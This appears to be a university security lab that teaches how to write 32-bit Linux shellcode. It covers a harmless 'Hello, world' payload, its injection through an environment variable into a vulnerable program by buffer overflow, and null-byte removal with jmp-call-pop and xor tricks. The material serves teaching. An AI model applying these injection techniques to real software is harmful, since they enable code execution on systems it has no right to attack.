# Shellcodes
## Introduction

In this lab we will take a look at how shellcodes are produced and we will try to write our own shellcodes.

You will need a vulnerable program of your choice and you can choose which kind of buffer-overflow to use (stack-based, heap-based, using the environment, ...).

## From C to shellcode

### C to assembly

Shellcodes are usually really simple and short program such as opening a shell, opening a port, appending a string to a file, etc.
In this case we will simply produce a shellcode that prints the string "Hello, world!" on the stdout. In C-lang the program would look something like this :
```C
#include <stdio.h>
int main(){
  printf("Hello, wolrd!\n");
  return 0;
}
```
The common thing among all basic shellcodes is that they use Unix system calls which are enumerated in the header file`/usr/include/i386-linux-gnu/asm/unistd_32.h`. In this file you can see that each call is attributed an integer value. For example the code for `write`is 4 while the code for `mkdir`is 39. This will be usefull in a moment !

In our case we would like to print something on the screen and this can be done with the `write(2)`syscall. You can see the specification of `write`via the man page.
```console
$ man 2 write
WRITE(2)                                                Linux Programmer's Manual                                                WRITE(2)

NAME
       write - write to a file descriptor

SYNOPSIS
       #include <unistd.h>

       ssize_t write(int fd, const void *buf, size_t count);
```
`write` takes a file descriptor as its first parameter, a sequence of char as its second and the size of the sequence as the third parameter.

Without going into too much details here is an assembly equivalent of this program that you can find in the file `helloworld1.s`:
```asm
; Taken from "The Art of Exploitation" by Jon Erickson
BITS 32           ; Tell nasm this is a 32-bit code.

  call mark_below ; Call bellow the string to instructions
  db "Hello, world!", 0x0a, 0x0d ; with newline and carriage return bytes.

mark_below:
; ssize_t write(int fd, const void *buf, size_t count);
  pop ecx         ; Pop the return address (string ptr) into ecx.
  mov eax, 4      ; "write" is syscall number 4 (from /usr/include/asm-i385/unistd.h)
  mov ebx, 1      ; STDOUT file descriptor
  mov edx, 15     ; Length of the string (14 + \0)
  int 0x80        ; Do syscall: write(1, string, 14)

; void_exit(int status);
  mov eax, 1      ; "exit" is syscall number 1
  mov ebx, 0      ; Status = 0
  int 0x80        ; Do syscall : exit(0)
```
The first call instruction jumps to `mark_below` and push the string bellow into the stack. The write call occures bellow `mark_below`. The first instruction is popping a value from the stack (our string) and storing it in register `ecx`. Next we put into register `eax` the system call we want (in this case 4 for `write`) then, following the `write(2)`specification, we put the file descriptor in the next register, followed by the string and the length of the string. At this point we have `eax -> 4; ebx -> 1; ecx -> "Hello, world!\r\n"; edx -> 15`. Finally the system call is triggered.

The last three instructions enable the clean exit.

Exo : Create own shellcode (like mkdir or something else) TODO

### Assembly to shellcode

Now that we have our instructions in assembly we can convert it into machine code using the tool `nasm`:

```console
$ nasm helloworld1.s
$ hexdump -C helloworld1
00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|
00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|
00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|
00000030  cd 80                                             |..|
00000032
```
We can try our shellcode on any vulnerable program and see if it works properly !
For simplicity we will store the shellcode in an env variable and predict its address on the stack.
```console
$ export HELLO=$(cat helloworld1)
$ ./getenvaddr  HELLO ./exploit
HELLO will be at 0xbffff7e6
$ ./exploit $(perl -e 'print "\xe6\xf7\xff\xbf"x100')
Segmentation fault
$
```
Woops it seems something went wrong... We should take a look at what happened to see if the segmentation fault comes from a mistake in our shellcode or our buffer-overflow.

We can take a look at the state of the memory just before the program crashed with some core dumping. It's not necessary to know exactly how it works but if you're interested you can take a look at how we found the memory dump of our shellcode.
<details>
  <summary>Click to see details</summary>
  
  ```console
  kali@kali: $ sudo su
  root@kali: $ ulimit -c unlimited # This will dump memory when the program crashes
  root@kali: $ export HELLO=$(cat helloworld1)
  root@kali: $ ./getenvaddr HELLO ./exploit
  HELLO will be at 0xbffff93e
  root@kali: $ ./exploit $(perl -e 'print "\x3e\xf9\xff\xbf"x100')
  Segmentation fault (core dumped)
  root@kali: $ ls -l ./core 
  -rw------- 1 root root 356352 Jul 29 12:57 ./core
  root@kali: $ gdb -q -c ./core
  Program terminated with signal SIGSEGV, Segmentation fault.
  #0  0x2c654152 in ?? ()
  root@kali: $ x/32xb 0xbffff93e
  0xbffff93e:	0xe8	0x0f	0x48	0x65	0x6c	0x6c	0x6f	0x2c
  0xbffff946:	0x20	0x77	0x6f	0x72	0x6c	0x64	0x21	0x0a
  0xbffff94e:	0x0d	0x59	0xb8	0x04	0xbb	0x01	0xba	0x0f
  0xbffff956:	0xcd	0x80	0xb8	0x01	0xbb	0xcd	0x80	0x00
  ```
</details>

When we dump the stack memory at the HELLO env variable address we get the following bytes :
```console
0xbffff93e:	0xe8	0x0f	0x48	0x65	0x6c	0x6c	0x6f	0x2c
0xbffff946:	0x20	0x77	0x6f	0x72	0x6c	0x64	0x21	0x0a
0xbffff94e:	0x0d	0x59	0xb8	0x04	0xbb	0x01	0xba	0x0f
0xbffff956:	0xcd	0x80	0xb8	0x01	0xbb	0xcd	0x80	0x00
```
But when we dump our `helloword1` shellcode we get the following bytes :
```console
$ hexdump -C helloworld1
00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|
00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|
00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|
00000030  cd 80                                             |..|
00000032
```

We can see that the two sequences of bytes differ. The first two bytes are correct but right after the three null bytes disappeared. In fact you can see that any null bytes are gone except the last one.

The reason behind that is that shellcodes are often injected into a process using the following function `strcpy` which terminates when encountering the first null byte. This indeed breaks our shellcode.

## Removing Null bytes

To avoid our shellcode beeing corrupted we need to get rid of any null bytes in it.

We can disassemble the generated shellcode and see where those bytes occur :

```console
$ ndisasm -b32 helloworld1
00000000  E80F000000        call 0x14 # Null bytes
00000005  48                dec eax
00000006  656C              gs insb
00000008  6C                insb
00000009  6F                outsd
0000000A  2C20              sub al,0x20
0000000C  776F              ja 0x7d
0000000E  726C              jc 0x7c
00000010  64210A            and [fs:edx],ecx
00000013  0D59B80400        or eax,0x4b859
00000018  0000              add [eax],al
0000001A  BB01000000        mov ebx,0x1 # Null bytes
0000001F  BA0F000000        mov edx,0xf # Null bytes
00000024  CD80              int 0x80
00000026  B801000000        mov eax,0x1 # Null bytes
0000002B  BB00000000        mov ebx,0x0 # Null bytes
00000030  CD80              int 0x80

```
We can see that the null bytes in this case appear on the `call` instruction and on the `mov` instruction so we will solve both of them.

### Solving the call instruction
The issue with the call instruction is that it allows much larger jump then the one we are making (13bytes) so we will have 3 padded bytes with 0's.

Now remember how itnegers work in 32-bit system. The first bit indicates if its positive or negative and so for example -13 in 32-bit is 0xFFFFFFF3. For this to work we would need to put the `call` at the end of the file. This way the bytes needed for the jump will be negative and we get rid of those Null bytes.

The trick now is to make a jump straight to the `call` instruction at the beginning using the `jmp short` instruction as follows :
```asm
; Taken from "The Art of Exploitation" by Jon Erickson
BITS 32           ; Tell nasm this is a 32-bit code.

jmp short one;

two:
; ssize_t write(int fd, const void *buf, size_t count);
  pop ecx         ; Pop th return address (string ptr) into ecx.
  mov eax, 4      ; "write" is syscall number 4 (from /usr/include/asm-i385/unistd.h)
  mov ebx, 1      ; STDOUT file descriptor
  mov edx, 15     ; Length of the string (14 + \0)
  int 0x80        ; Do syscall: write(1, string, 14)

; void_exit(int status);
  mov eax, 1      ; "exit" is syscall number 1
  mov ebx, 0      ; Status = 0
  int 0x80        ; Do syscall : exit(0)

one:
  call two ; Call bellow the string to instructions
  db "Hello, world!", 0x0a, 0x0d ; with newline and carriage return bytes.
```

```console
$ nasm helloworld2.s 
$ ndisasm -b32 helloworld2
00000000  EB1E              jmp short 0x20
00000002  59                pop ecx
00000003  B804000000        mov eax,0x4
00000008  BB01000000        mov ebx,0x1
0000000D  BA0F000000        mov edx,0xf
00000012  CD80              int 0x80
00000014  B801000000        mov eax,0x1
00000019  BB00000000        mov ebx,0x0
0000001E  CD80              int 0x80
00000020  E8DDFFFFFF        call 0x2
00000025  48                dec eax
00000026  656C              gs insb
00000028  6C                insb
00000029  6F                outsd
0000002A  2C20              sub al,0x20
0000002C  776F              ja 0x9d
0000002E  726C              jc 0x9c
00000030  64210A            and [fs:edx],ecx
00000033  0D                db 0x0d
```

Good we don't have any null bytes left for the `call instruction` !

This trick is widely used so you should be aware of it.
### Solving the mov instructions
You saw in previous classes (Systèmes informatiques,...) that a computer uses register at the CPU level to store memory value. Nowadays those registers; EAX, EBX, ECX,...; are 32-bit long but you can still use the previously used 16-bit registers; AX, BX, CX,... ; which correspond to the 16 first bits of the 32-bit registers. Furhtermore you can also access the individual bytes of those 16-bit registers by using the registers AL, AH, BL, BH, CL, CH, ... where L describes the lower byte and H describe the higher byte.

So for example if we were to move a value less than 256 into a register we could use either of the following instructions :
|  Machine code 	|   Instructions	|
|---	|---	|
|B8 09 00 00 00   	| mov eax, 0x9  	|
| 66 B8 09 00 	|   mov ax, 0x9	|
|   B8 09	|   mov al, 0x9	|

We got rid of the null bytes but we run into an issue. We don't know for sure that the registers we are using are blank (zeroed) before we use them. In fact while writing shellcodes ther is a good chance that they are not.

How do we clear them if we cannot use an instruction like `mov eax, 0x0` because it would generate a null byte?

There are two easy solutions :

```asm
sub eax, eax
; or
xor eax, eax
```
Both instructions are equivalent even tho the `xor` one is used more often.

With that in mind we can translate our `mov` instructions into correct shellcode-aware instructions.

```asm
mov eax, 4
; becomes
xor eax, eax
mov al 4
```
 And we can apply this to the whole helloworld1.s file :
 
 ```asm
 ; Taken from "The Art of Exploitation" by Jon Erickson
BITS 32           ; Tell nasm this is a 32-bit code.

jmp short one;

two:
; ssize_t write(int fd, const void *buf, size_t count);
  pop ecx         ; Pop the return address (string ptr) into ecx.
  xor eax, eax    ; Zero out full 32 bits of eax register.
  mov al, 4       ; "write" is syscall number 4 (from /usr/include/asm-i385/unistd.h)
  xor ebx, ebx    ; Zero out ebx.
  inc ebx         ; Cleaner than "mov bl, 1"
  xor edx, edx    ; Zero out edx
  mov dl, 15      ; Length of the string
  int 0x80        ; Do syscall: write(1, string, 14)

; void_exit(int status);
  mov al, 1       ; "exit" is syscall number 1
  dec ebx         ; ebx was "1" so we put it back to 0. Simpler than "xor ebx, ebx"
  int 0x80        ; Do syscall : exit(0)

one:
  call two ; Call bellow the string to instructions
  db "Hello, world!", 0x0a, 0x0d ; with newline and carriage return bytes.
 
 ```

If we assemble this shellcode and dump the result we get the following sequence of bytes :

```console
$ nasm helloworld3.s 
$ hexdump -C helloworld3 | grep --color=auto 00
00000000  eb 13 59 31 c0 b0 04 31  db 43 31 d2 b2 0f cd 80  |..Y1...1.C1.....|
00000010  b0 01 4b cd 80 e8 e8 ff  ff ff 48 65 6c 6c 6f 2c  |..K.......Hello,|
00000020  20 77 6f 72 6c 64 21 0a  0d                       | world!..|
00000029
```

We can see that there is no more null bytes and if we inject this shellcode into a vulnerable program we indeed get "Hello, World!" printed !
